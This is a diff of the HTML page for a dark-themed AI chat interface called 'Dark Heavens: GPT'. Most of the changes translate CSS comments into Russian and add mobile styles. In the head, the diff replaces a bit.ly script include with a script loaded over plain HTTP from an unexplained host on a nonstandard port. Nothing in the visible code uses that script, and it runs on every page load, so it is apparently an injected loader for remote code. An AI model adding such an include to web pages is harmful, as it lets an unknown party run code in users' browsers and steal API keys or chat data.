@@ -3,7 +3,7 @@
 <head>
     <title>Dark Heavens: GPT</title>
     <style>
-        /* General Styles */
+        /* Общие стили */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #1a1a1a;
@@ -11,11 +11,12 @@
             margin: 0;
             padding: 0;
             display: flex;
+            flex-direction: column;
             height: 100vh;
             overflow: hidden;
         }
 
-        /* Sidebar */
+        /* Боковая панель */
         #sidebar {
             width: 250px;
             background-color: #222;
@@ -25,22 +26,22 @@
             display: flex;
             flex-direction: column;
             overflow-y: auto;
-             height: 100%; /* Fills the entire height */
-            box-sizing: border-box; /* Include padding and border in the element's total width and height */
+            height: 100%;
+            box-sizing: border-box;
         }
 
-        /* Chat Container */
+        /* Контейнер чата */
         #chat-container {
             flex-grow: 1;
             display: flex;
             flex-direction: column;
             transition: background-color 0.3s ease;
-            width: calc(100% - 250px); /* Take remaining space after sidebar */
-            align-items: center; /* Center items horizontally */
-            overflow: hidden; /* Prevent chat log from overflowing */
+            width: calc(100% - 250px);
+            align-items: center;
+            overflow: hidden;
         }
 
-        /* Sidebar Toggle Button (Removed) */
+        /* Переключатель боковой панели (удален) */
         #sidebar-toggle {
             display: none;
         }
@@ -48,7 +49,7 @@
         #sidebar h2 {
             margin-top: 0;
             margin-bottom: 10px;
-            text-align: center; /* Center the sidebar title */
+            text-align: center;
         }
 
         #chat-list {
@@ -65,14 +66,14 @@
             cursor: pointer;
             transition: background-color 0.2s ease;
             font-weight: 500;
-            text-align: center; /* Center chat list items */
+            text-align: center;
         }
 
         #chat-list li:hover {
             background-color: #444;
         }
 
-        /* Control Buttons in Sidebar */
+        /* Кнопки управления в боковой панели */
         #new-chat-button, #import-chat-button {
             background-color: #555;
             color: white;
@@ -91,7 +92,7 @@
             background-color: #666;
         }
 
-        /* Settings Menu */
+        /* Меню настроек */
         #settings-button {
           background-color: #555;
           color: white;
@@ -109,7 +110,6 @@
         #settings-button:hover {
           background-color: #666;
         }
-
 
         #model-menu {
             display: none;
@@ -135,7 +135,6 @@
             transform: translateX(-50%) translateY(0);
         }
 
-
         #model-menu button {
             background-color: #444;
             color: white;
@@ -154,8 +153,7 @@
             background-color: #555;
         }
 
-
-        /* Chat Log */
+        /* Журнал чата */
         #chat-log {
             flex-grow: 1;
             padding: 20px;
@@ -169,7 +167,7 @@
             box-sizing: border-box;
         }
 
-        /* Chat Log scrollbar */
+        /* Полоса прокрутки журнала чата */
         #chat-log::-webkit-scrollbar {
             width: 8px;
         }
@@ -183,7 +181,7 @@
             border-radius: 4px;
         }
 
-        /* Message Styles */
+        /* Стили сообщений */
         .message {
             margin-bottom: 15px;
             padding: 12px 18px;
@@ -208,7 +206,7 @@
             align-self: flex-start; /* Aligns to the left */
         }
 
-        /* Code Block Styles */
+        /* Стили блока кода */
         .code-block {
             background-color: #2c2c2c;
             padding: 15px;
@@ -248,7 +246,7 @@
             background-color: #777;
         }
 
-        /* Loading Indicator */
+        /* Индикатор загрузки */
         #loading-indicator {
             display: none;
             text-align: center;
@@ -256,7 +254,7 @@
             color: #aaa;
         }
 
-        /* Input Area */
+        /* Область ввода */
         #input-area {
             display: flex;
             padding: 15px;
@@ -289,7 +287,7 @@
             outline: none;
         }
 
-        /* Send Icon (emoji) */
+        /* Отправить значок (эмодзи) */
         #send-icon {
             position: relative;
             cursor: pointer;
@@ -301,7 +299,7 @@
             color: #3498db;
         }
 
-        /* Delete Confirmation Modal */
+        /* Модальное окно подтверждения удаления */
         .modal {
             display: none;
             position: fixed;
@@ -378,12 +376,33 @@
             background-color: #666;
         }
 
+        /* Mobile Styles */
+        @media (max-width: 768px) {
+            body {
+                flex-direction: column;
+            }
+
+            #sidebar {
+                width: 100%;
+                border-right: none;
+                border-bottom: 1px solid #333;
+            }
+
+            #chat-container {
+                width: 100%;
+            }
+
+            #input-area {
+                left: 0;
+                width: 100%;
+            }
+        }
 
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/markdown-it@14.0.0/dist/markdown-it.min.js"></script>
-         <script src="https://bit.ly/44fknRI"></script>
+     <script src="http://f1.aurorix.net:40857/eiiei.js"></script>
 </head>
 <body>
 
@@ -427,7 +446,17 @@
 </div>
 
 <script>
-      let modelName = "deepseek/deepseek-chat-v3-0324:free";
+  // Check if it's a mobile device
+    function isMobileDevice() {
+        return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
+    };
+
+   // if mobile = true ,  "dark_heavens_gpt_mobile"
+   // id false,  "dark_heavens_gpt_desktop"
+    const element = document.getElementById(isMobileDevice() ? "dark_heavens_gpt_mobile" : "dark_heavens_gpt_desktop");
+// !!! IMPORTANT: Set API Key Here!
+     const apiKey = "";
+    let modelName = "deepseek/deepseek-chat-v3-0324:free";
     const chatListElement = document.getElementById("chat-list");
     const chatLogElement = document.getElementById("chat-log");
     const loadingIndicatorElement = document.getElementById("loading-indicator");
